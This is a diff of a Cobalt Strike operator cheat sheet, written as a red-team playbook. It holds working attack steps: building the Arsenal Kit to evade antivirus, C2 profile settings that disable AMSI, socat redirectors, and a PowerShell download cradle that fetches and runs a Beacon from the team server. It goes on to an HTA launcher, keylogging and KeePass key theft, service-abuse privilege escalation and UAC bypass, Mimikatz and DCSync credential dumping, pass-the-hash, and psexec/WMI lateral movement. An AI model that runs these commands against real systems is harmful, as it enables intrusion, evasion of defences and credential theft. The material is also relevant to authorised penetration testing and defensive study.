@@ -10,36 +10,69 @@ cd /opt/cobaltstrike/
 
 - Arsenal Kit
 https://download.cobaltstrike.com/scripts
+
 Included Kits:
-    Artifact Kit
+    Artifact Kit - a source code framework to build executables and DLLs that evade some anti-virus products.
     Mimikatz Kit
     Process Injection Kit
     Resource Kit
     Sleep Mask Kit
     User Defined Reflective Loader Kit
-tar -zxvf /home/kali/Downloads/arsenal-kit20220427.tgz
-mv arsenal-kit/ .
+
+tar -zxvf /home/kali/Downloads/arsenal-kit20220613.tgz
+cd arsenal-kit/
+vi arsenal_kit.config                             Make the following changes.
+include_udrl_kit="true"
+include_sleepmask_kit="true"
+include_process_inject_kit="true"
+include_resource_kit="true"
+include_mimikatz_kit="true"
+artifactkit_stage_size=412256                     BokuLoader recommended size.
+
+./build_arsenal_kit.sh
+
+- OPSEC - add the following options to your Malleable C2 profile:
+set pipename            "changeme##";             The default SMB Beacon named pipe is msagent_##.
+set ssh_banner          "changeme";               The dafault SSH banner is Cobalt Strike 4.2.
+set ssh_pipename        "changeme";               The default SSH Beacon named pipe is \\.\pipe\postex_ssh_####.
+
+https-certificate {
+    Change the location options.
+
+stage {
+    set userwx          "false";
+    set stomppe         "true";
+    set obfuscate       "true";
+    set name            "changeme.dll";
+    set cleanup         "true";
+    set sleep_mask      "true";
+    set smartinject     "true";
+
+process-inject {
+    set allocator       "NtMapViewOfSection";
+    set userwx          "false";
+    set smartinject     "true";
+
+post-ex {
+    set spawnto_x86 "%windir%\\SYSWOW64\\dllhost.exe";
+    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
+    set obfuscate       "true";
+    set smartinject     "true";
+    set amsi_disable    "true";
+    set pipename "changeme_####, win\\changeme_##";
+
+Be sure to review malleable-c2-profiles/normal/reference.profile for more default settings.
 
 - Remove old data and Beacons (optional)
-Stop the team server
+Stop the team server.
 rm -rf data/
 
 - Start the team server
 Start a screen or tmux session.
 
-Parameters wrapped in [ ] are mandatory, those in < > are optional
-./teamserver [IP] [password] <Malleable C2 profile> <kill date for Beacons yyyy-mm-dd>
-
-OPSEC - add the following options to your Malleable C2 profile:
-    set startrwx        "false";
-    set userwx          "false";
-    set cleanup         "true";
-    set stomppe         "true";
-    set obfuscate       "true";
-    set sleep_mask      "true";
-    set smartinject     "true";
-
-./teamserver 192.168.1.5 password malleable-c2-profiles/APT/etumbot.profile 2021-12-31
+Parameters in <> are mandatory, those in [] are optional
+./teamserver <IP> <password> [Malleable C2 profile] [kill date for Beacons yyyy-mm-dd]
+./teamserver 192.168.1.5 password malleable-c2-profiles/APT/etumbot.profile 2022-12-31
 
 When the team server starts, it will display the SHA256 hash of the SSL cert. Verify this hash when connecting.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -53,7 +86,7 @@ cd /opt/cobaltstrike/
 Host: 127.0.0.1
 Port: 50050
 User: <your name>
-Password: <password you entered from above>
+Password: <password you entered above>
 Connect
 Verify Fingerprint (SHA256 hash from above) > Yes
 
@@ -63,16 +96,22 @@ ssh -f -N -L 50050:127.0.0.1:50050 user@teamserver
 Follow the steps from above.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Redirectors
+# Redirectors (passthroughs)
 
 OPSEC: Never allow a Beacon to make direct connections to your team server. Always use a redirector to forward the traffic.
 
-- Create 3 free Ubuntu instances in AWS. These instances will be used for the following:
-Redirector1 - HTTP
-Redirector2 - HTTPS
-Redirector3 - DNS
+- Create 3 free Ubuntu instances in the cloud. These instances will be used for the following:
+Redirector 1 - HTTP
+Redirector 2 - HTTPS
+Redirector 3 - DNS
 
-Install socat on each instance: sudo apt install socat
+- Install socat on each instance
+sudo -i
+apt-get install -y socat
+screen
+socat tcp4-listen:80,fork tcp4:<team server IP>:80 &                   Redirector 1
+socat tcp4-listen:443,fork tcp4:<team server IP>:443 &                 Redirector 2
+socat udp4-recvfrom:53,reuseaddr,fork udp4-sendto:<team server IP>     Redirector 3
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Valid SSL certificate for Beacon 
@@ -115,7 +154,7 @@ DNS Hosts: click + <Redirector3 IP>
 Save > OK
 
 Peer-to-peer listeners allow Beacons to chain their comms together over SMB or TCP.
-This is needed when a target you compromised cannot reach your Team Server directly over HTTP.
+This is needed when a target you compromised cannot reach your team server directly over HTTP.
 
 Add
 Name: smb
@@ -127,9 +166,9 @@ Save > OK
 
 OPSEC: Staged payloads tend to have more indicators compared to stageless.
 Always prefer a fully staged or stageless payload and disable payload staging.
-When you see (S) in the framework, it refers to a stageless payload.
+(S) in the framework refers to a stageless payload.
 
-- Disable Windows Defender on your target Windows VM.
+- Disable Windows Defender on your target Windows VM
 Enterprise: Windows Security > Virus & threat protection > Manage settings > turn off Real-time protection > Yes
 Standard: Windows Defender settings > turn off Real-time protection
 
@@ -141,20 +180,20 @@ Use x64 payload
 Generate
 Select the location for the payload > Save > OK
 
-Transfer the payload to your target, execute, and you should receive a call back.
+Transfer the payload to your target and execute.
 Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
 
 - Interact with Beacon
 Right-click on the Beacon > Interact
-help                                          List of available help commands
-help <command>                                Get more help on a particular command
-ctrl +/-                                      Increase or decrease the font size
-ctrl k                                        Clear the tab
+help                                              Show available help commands
+help <command>                                    Get more help on a particular command
+ctrl +/-                                          Increase or decrease the font size
+ctrl k                                            Clear the tab
 
-By default, Beacon will check in every 60 seconds.
-sleep 0                                       Make Beacon interactive
-sleep 2                                       Make Beacon call home every 2 seconds
-sleep 30 10                                   Make Beacon call home every 30 seconds with a 10% jitter
+- By default, Beacon will check in every 60 seconds.
+sleep 0                                           Make Beacon interactive
+sleep 2                                           Make Beacon call home every 2 seconds
+sleep 30 10                                       Make Beacon call home every 30 seconds with a 10% jitter
 
 Right-click on the X in the tab for additional options.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -177,29 +216,29 @@ Launch
 Copy the download cradle provided > OK
 powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:80/a'))"
 
-Open a Command Prompt on your Windows VM and run the download cradle.
+Open a Command Prompt on your Windows VM and execute the download cradle.
 
 Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
 
 - Example 2
 Create a new file text file on a Windows VM called test.hta and paste in the following:
 <html>
-  <head>
-    <title>Hello World</title>
-  </head>
-  <body>
-    <h2>Hello World</h2>
-    <p>This is an an HTA example.</p>
-  </body>
+    <head>
+      <title>Hello World</title>
+    </head>
+    <body>
+      <h2>Hello World</h2>
+      <p>This is an an HTA example.</p>
+    </body>
 
-  <script language="VBScript">
-    Function Pwn()
-      Set shell = CreateObject("wscript.Shell")
-      shell.run "calc"
-    End Function
+    <script language="VBScript">
+      Function Pwn()
+        Set shell = CreateObject("wscript.Shell")
+        shell.run "calc"
+      End Function
 
-    Pwn
-  </script>
+      Pwn
+    </script>
 </html>
 
 Make sure real-time protection is turned off.
@@ -235,50 +274,31 @@ Launch > OK
 
 Copy the URI provided > OK
 
-Open Internet Explorer on your Wibndows VM to http://192.168.1.5/survey.txt
+Open Internet Explorer on your Windows VM to http://192.168.1.5/survey.txt
 Open > Allow
 Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-View > Web Log is helpful to know when HTTP requests are hitting your team server.
+View > Web Log
+This is helpful to know when HTTP requests are hitting your team server.
 Use the up arrow to scroll through previous commands.
 Beacon is fully tab-completable.
 All commands and their output are written to the logs directory.
 ctrl+k will clear the current window.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Commands
-
-run                                               Execute a shell command via cmd.exe
-powerpick                                         Execute PowerShell via Unmanaged PowerShell
-psinject                                          Inject Unmanaged PowerShell into a process
-powershell-inport                                 Import a PowerShell script
-execute-assembly                                  Run a local .NET executable
-spawn/spawnto                                     Spawn a session in rundll32
-inject                                            Inject a session into a process
-dllinject                                         Inject a reflective DLL into a process
-shinject                                          Inject shellcode into a process
-ppid                                              Change the Parent Process ID
-blockdlls start                                   Ask a Beacon with a signature policy that prevents non-Microsft DLLs from loading
-upload/download                                   Transfer files to and from a target
-keylogger
-screenshot
-socks 
-portscan
-elevate
-logonpassword                                     Use Mimikatz to dump passwords
-dcsync                                            Dump hashes from a domain controller
-steal_token                                       Impersonate a user from another process
-make_token                                        Create a token for a user using creds
-kerberos_ticket_use                               Inject Kerberos ticket
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 # Enumeration
 
-Seatbelt
-Part of https://github.com/Flangvik/SharpCollection
-execute-assembly /opt/Seatbelt.exe -group=system
-execute-assembly /opt/Seatbelt.exe -group=user
+- Beacon Object Files (BOF)
+A compiled C program that executes within Beacon and can call Win32 and Beacon APIs without spawning and injecting into a new process.
+
+Cobalt Strike > Script Manger > Load:
+/opt/cobaltstrike/third-party/outflanknl-helpcolor/HelpColor.cna
+/opt/cobaltstrike/third-party/trustedsec-bof/SA/SA.cna
+
+helpx                                             New commands are added and OPSEC color coded.
+whoami
+userenum
 
 keylogger <PID> x64                               Inject a keystroke logger into a process
                                                   View > Keylogger > select item in lower left pane
@@ -289,59 +309,11 @@ psinject <PID> x64 Start-ClipboardMonitor -CollectionLimit 5
 screenshot <PID> x64                              Take a screenshot
                                                   View > Screenshots > select item in lower left pane
 
-KeeThief
+- KeeThief
 https://github.com/GhostPack/KeeThief
 powershell Get-KeePassDatabaseKey
 
-Cobalt Strike > Script Manger > Load > /opt/cobaltstrike/third-party/trustedsec-bof/SA/SA.cna
-help                                              New commands are added. There is no fork and run baggage.
-                                                  Everything is executing in the context of Beacon.
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Old school enumeration
-
-getuid                                            Get User ID
-ps                                                Show process list
-
-pwd                                               Print current directory
-ls                                                List files
-drives                                            List drives on target
-
-shell tasklist
-shell ver
-shell ipconfig /all
-shell arp -a
-shell systeminfo                                  System info
-shell net time                                    Show time for a host
-shell netstat -ano
-shell whoami
-shell net start
-shell qprocess
-
-net computers                                     List hosts in a domain (groups)
-net domain                                        Display domain for this host
-net dclist                                        List domain controllers
-net domain_controllers                            List DCs in a domain (groups)
-net domain_trusts                                 List domain trusts
-shell net accounts                                Policy settings for user accounts
-net user                                          List users and user information
-net group                                         List groups and users in groups
-net localgroup                                    List local groups and users in local groups
-net localgroup Users                              Show users in the Users security group
-net localgroup Administrators                     Show users in the Administrators security group
-net logons                                        List users logged onto a host
-net sessions                                      List sessions on a host
-net share                                         List shares on a host
-
-net view                                          List hosts in a domain (browser service)
-
-jobs                                              List long-running post-exploitation tasks. Look for keylogger JID
-jobkill <JID>                                     Kill a long-running post-exploitation task. Kill the keylogger using its JID
-jobs                                              Verify the keylogger is no longer running
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# PowerShell weaponization
-
+- PowerShell weaponization
 powershell <cmdlet> <args>                        Starts powershell.exe and uses the highest supported PowerShell version
 powerpick <cmdlet> <args>                         Spawns a sacrificial process specified by spawnto and injects UnmanagedPowerShell into it
 psinject <PID> <arch> <cmdlet> <args>             Injects UnmanagedPowerShell into the specified process
@@ -350,172 +322,153 @@ psinject <PID> <arch> <cmdlet> <args>             Injects UnmanagedPowerShell in
 # Privilege Escalation
 
 getsystem                                         SYSTEM account impersonation using named pipes
-elevate svc-exe [listener] (creates a service that runs a payload as SYSTEM)
+elevate svc-exe                                   Creates a SYSTEM service that will run our payload
+elevate uac-token-duplication                     Bypass UAC, this gives you a pseudo-high integrity token
 
-powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
-powershell Invoke-PrivescAudit
+- PowerUp
+powershell-import /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
+powerpick Invoke-PrivescAudit
 
-- Example output
-
-ServiceName   : VulnSvc
+Example output
+ServiceName   : BetaSvc
 Path          : C:\Temp\vuln.exe
 StartName     : LocalSystem
-AbuseFunction : Invoke-ServiceAbuse -Name 'VulnSvc'
+AbuseFunction : Invoke-ServiceAbuse -Name 'BetaSvc'
 CanRestart    : Trun
-Name          : VulnSvc
+Name          : BetaSvc
 Check         : Modifiable Services
 
-We can exploit this misconfiguration by replacing the executable path with our own exe that will launch a Beacon.
-
-ls C:\Temp                                        Check to see if the exe exists.
-
-If not, we can just upload our malicous exe to that location without having to delete a file or modify service.
-
-Attacks > Packages > Windows Executable (S)
-Stage: select your stage
-Output: Windows Service EXE
-x64: check box
-Generate
- 
-cd C:\Temp                                        Change to the target directory.
-upload /root/vuln.exe                             Upload malicious exe.
-ls                                                Verify the exe has uploaded.
-run sc start VulnSvc                              Start the service.
-
-You should now have a new Beacon.
-----------------------------------------------
-
-SharpUp is a C# port of PowerUp
-Part of https://github.com/Flangvik/SharpCollection
-Not all checks are ported.
-execute-assembly /opt/GhostPack/SharpUp/SharpUp.exe
-
-elevate uac-token-duplication                     Bypass UAC, this gives you a pseudo-high integrity token
-elevate svc-exe                                   Creates a SYSTEM service that will run our payload
-
-https://github.com/rasta-mouse/Watson
-Part of https://github.com/Flangvik/SharpCollection
-
-Cobalt Strike > Script Manger > Load > /opt/cobaltstrike/elevatekit/elevate.cna
-elevate or runasadmin                             New commands are added
-
-powerpick Invoke-ServiceAbuse -Name 'crappy-service'
+- attack 1
+powerpick Invoke-ServiceAbuse -Name 'BetaSvc'
 spawnas john Password123! smb
 Select john in the top pane > right-click > Interact
 bypassuac http
 john should now be running in a high integrity Beacon (see asterisk)
-------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Transfer files
+- attack 2
+We can exploit this misconfiguration by replacing the exe with our own exe that will launch a Beacon.
+ls C:\Temp    See if the vulnerable exe exists.
+If not, we can upload our malicous exe to that location without having to delete files or modify the service config.
 
-download <path to file>
-upload <path to file>
+Attacks > Packages > Windows Executable (S)
+Stage: select your stage
+Output: Windows Service EXE
+Generate
+ 
+cd C:\Temp                                        Change to the target directory.
+upload /root/vuln.exe                             Upload our payload.
+ls                                                Verify the payload was uploaded.
+run sc start BetaSvc                              Start the service. You should have a new Beacon running as SYSTEM.
+
+- SharpUp
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/SharpUp.exe
+
+- Seatbelt
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=system
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=user
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Credential Abuse
 
-hashdump
-chromedump                                        Recover Google Chrome passwords from the current user
-
-make_token DOMAIN\user password
-
-inject <PID> x64 >listener>
-
+- Double-hop workarounds
+1. Use a token that points to a non-network logon session
 steal_token <PID>
+inject <PID> x64 <listener>
 
-mimikatz !lsadump::sam
+2. Create a new token and logon session that has creds
+make_token <DOMAIN\user> <password>
+spawnas <DOMAIN\user> <password> <listener>
+pth <DOMAIN\user> <hash>
 
-SharpDump
-Part of https://github.com/Flangvik/SharpCollection
+- Mimikatz
+::                                                Show parent modules.
+sekurlsa::                                        Show submodules for a given parent.
+privilege::debug
+token::elevate
+sekurlsa::logonPasswords
 
-execute-assembly /opt/Seatbelt.exe LSASettings
-execute-assembly /opt/Seatbelt.exe CredGuard
-execute-assembly /opt/Seatbelt.exe -q SecPackageCreds
+lsadump::<module>                                 Interact with the Local Security Authority (LSA).
+    ::sam                                         Local account hashes from the SAM database using the registry.
+    ::lsa                                         Local account hashes via the LSA APIs (and domain hashes on DCs).
+    ::cache                                       Domain cached credentials on the system.
+    ::secrets                                     LSA Secrets (ex: service account passwords).
+    ::dcsync /user:<DOMAIN\user>
 
-execute-assembly /opt/Rubeus.exe dump
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe LSASettings
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe CredGuard
+
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q SecPackageCreds
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe dump
+
+hashdump                                          Recover local account password hashes.
+logonpasswords                                    Harvest credentials with mimikatz.
+View > Credentials
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Lateral movement
 
-Always use a FQDN instead of an IP.
+schtasks /create /s <IP> /tn <name> /u <user> /sc <frequency> /p <password> /st <time> /sd <date> <command>
+sc \\IP create Service binPath= "command"
+wmic /node:target.domain process call create "C:\Windows\System32\cmd.exe /c beacon.exe"
+
+jump wmi_msbuild <target> <listener>
+
+- Double-hop options
+make_token <DOMAIN\user> <password>
+inject <PID> x64 <listener>
+steal_token <PID>
+pth <DOMAIN\user> <hash>
+spawnas <DOMAIN\user> <password> <listener>
+
+socks <port>                                      Opens a port on the team server. Be sure to restrict access.
+proxychains <tool/options>
+/etc/proxychains.conf                             Edit your attack VM’s config to your team server IP and port.
+proxychains xfreerdp /u:<DOMAIN\user> /p:<password> /v:<IP>
 
 jump psexec                                       Run service EXE on remote host
 jump psexec_psh                                   Run a PowerShell one-liner on remote host via a service
 jump winrm                                        Run a PowerShell script via WinRM on remote host
 remote-exec <any of the above>                    Run a single command using the above methods on remote host
+
+make_token <DOMAIN\user> <password>
+powershell-import /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
+powerpick get-domainuser <user>
+powerpick Get-DomainComputer -Ping -Properties dnshostname
+powerpick Get-NetLocalGroupMember <computer>      List the local administrators group on a computer.
+ls \\<computer>\C$                                Check to see if you have access.
+jump <psexec, psexec64, winrm, winrm64> <computer> <listener>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Process injection
 
-inject <pid>
-dllinject <pid>                                   Reflective DLL injection
-dllload <pid>                                     Loading an on-disk DLL to memory
-spawnto <arch> <full-exe-path>                    Process hollowing
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-upload /tmp/beacon.dll
-remote-exec wmi fileserver rundll32 c:\windows\temp\beacon.dll,start
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Emulate lateral movement between one victim egress host and four other hosts, that uses SMB for lateral
-  movement, as well as follow-on victim to victim communications.
-
-Controller domain: acme.org
-Controller IP: x.x.x.x
-
-ifconfig eth0 add x.x.x.x
-cd /opt/cobaltstrike/
-rm data/*.bin
-./teamserver 192.168.1.5 password /opt/cobaltstrike/third-party/profiles/APT/etumbot.profile
-
-Start Cobalt Strike and point to localhost.
-
-Create http and smb listeners.
-
-Launch an attack to gain a foothold.
-
-Login to wkstn-10 as Administrator, open a command prompt, and paste in the PowerShell.
-You should have an http Beacon on Cobalt Strike in about 10 sec.
-
-Right-click on the new http Beacon > Interact
-sleep 0                                           Make the Beacon interactive
-note foothold
-
-ps                                                Look for another user logged in
+ps                                                Look for another user that is logged in.
 inject <PID> <arch> <listener>
-inject 5678 x64 smb
-Right-click on the new smb Beacon > Interact
-hashdump                                          Recover local account password hashes
-logonpasswords                                    Harvest credentials with mimikatz
-View > Credentials
+dllinject <PID>                                   Reflective DLL injection.
+dllload <PID>                                     Loading an on-disk DLL to memory.
+spawnto <arch> <full-exe-path>                    Process hollowing.
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
-net view /domain
-make_token site\administrator password
-net group "Domain Computers" /DOMAIN              Show computers joined to the domain
-shell nltest /dclist:SITE                         Locate the domain controller
-ls \\wkuser-20\C$                                 Test remote access
-psexec_psh wkuser-20 smb                          You should have a new smb Beacon in about 10 sec
+# Remotely execute a DLL
 
-Right-click on the new smb Beacon > Interact
-sleep 2                                           Have the Beacon check in once every 2 seconds
-note 1st hop
-ps
-hashdump
-logonpasswords
-make_token site\administrator password
-ls \\site-file\C$
-psexec_psh site-file smb
+upload /tmp/beacon.dll                            Upload your malicious DLL.
+ls                                                Verify it was uploadted.
+remote-exec wmi <FQDN> rundll32 c:\windows\temp\beacon.dll,start
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Right-click on the new http Beacon > Interact
-sleep 2
-note 2nd hop
-ps
-hashdump
-logonpasswords
-make_token site\administrator password
-ls \\site-dc\C$
-psexec_psh site-dc smb	
-	
-Right-click on the new http Beacon > Interact
-sleep 2
-note 3rd hop
+# Active Directory
+
+nltest /dsgetdc:<domain>                          Show all domain controllers in a given domain.
+nltest /domain_trusts /all_trusts                 Show add domain trusts for the current domain.
+
+- PowerView
+Get-Forest                                        Show the forest object for the current forest.
+Get-ForestDomain                                  Show all domains for a forest.
+Get-DomainTrust                                   Show all domain trusts for the current domain or a specified domain.
+Get-ForestTrust                                   Show all forest trusts for the current forest or a specified forest.
+
+Get-DomainComputer -Domain <test.domain>          Find a computer in a trusted domain.
+Get-DomainUser -Domain <dev.domain>               Find a user in a trusted domain.
+Get-DomainTrustMapping | Export-CSV -NoTypeInformation trusts.csv
+
+
+
